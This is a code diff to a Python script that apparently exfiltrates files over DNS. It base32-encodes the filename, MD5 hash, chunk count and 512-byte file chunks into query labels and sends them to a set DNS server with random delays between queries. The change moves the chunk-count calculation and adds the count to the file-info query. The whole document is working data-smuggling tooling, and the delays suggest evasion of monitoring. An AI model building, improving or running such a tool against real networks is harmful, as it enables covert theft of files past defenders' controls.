@@ -28,12 +28,9 @@ def send_dns_query(data, server_ip, max_delay):
     time.sleep(delay)
 
 # Function to send file in chunks with a chunk counter
-def send_file_chunks(file_path, server_ip, domain, max_delay):
-    file_size = os.path.getsize(file_path)
+def send_file_chunks(file_path, server_ip, domain, max_delay, total_chunks):
     chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
-    total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)
-    print(f"Total chunks to send: {total_chunks}")
-
+    
     with open(file_path, "rb") as file:
         for chunk_number in range(total_chunks):
             chunk_data = file.read(chunk_size)
@@ -44,14 +41,15 @@ def send_file_chunks(file_path, server_ip, domain, max_delay):
             print(f"Sending chunk {chunk_number + 1}/{total_chunks}")
             send_dns_query(query, server_ip, max_delay)
 
-# Function to send file information (filename and MD5 hash)
-def send_file_info(file_name, file_md5, server_ip, domain, max_delay):
+# Function to send file information (filename, MD5 hash, and total chunks)
+def send_file_info(file_name, file_md5, total_chunks, server_ip, domain, max_delay):
     # Use static "fileinfo" prefix for the file info query
     encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
     encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")
+    encoded_total_chunks = base64.b32encode(str(total_chunks).encode()).decode().strip("=")
 
-    query = f"f.{encoded_file_name}.{encoded_file_md5}.{domain}"
-    print(f"Sending file info: {file_name}, MD5: {file_md5}")
+    query = f"f.{encoded_file_name}.{encoded_file_md5}.{encoded_total_chunks}.{domain}"
+    print(f"Sending file info: {file_name}, MD5: {file_md5}, Total Chunks: {total_chunks}")
     send_dns_query(query, server_ip, max_delay)
 
 # Function to signal end of transmission
@@ -66,11 +64,16 @@ def send_file(file_path, max_delay):
     file_name = os.path.basename(file_path)
     file_md5 = calculate_md5(file_path)
 
-    # Send file info (filename and MD5 hash)
-    send_file_info(file_name, file_md5, DNS_SERVER, domain, max_delay)
+    # Calculate total number of chunks
+    file_size = os.path.getsize(file_path)
+    chunk_size = 512
+    total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)
+
+    # Send file info (filename, MD5 hash, and total chunks)
+    send_file_info(file_name, file_md5, total_chunks, DNS_SERVER, domain, max_delay)
 
     # Send file chunks with chunk counter and random delays
-    send_file_chunks(file_path, DNS_SERVER, domain, max_delay)
+    send_file_chunks(file_path, DNS_SERVER, domain, max_delay, total_chunks)
 
     # Signal the end of transmission
     send_end_signal(DNS_SERVER, domain, max_delay)
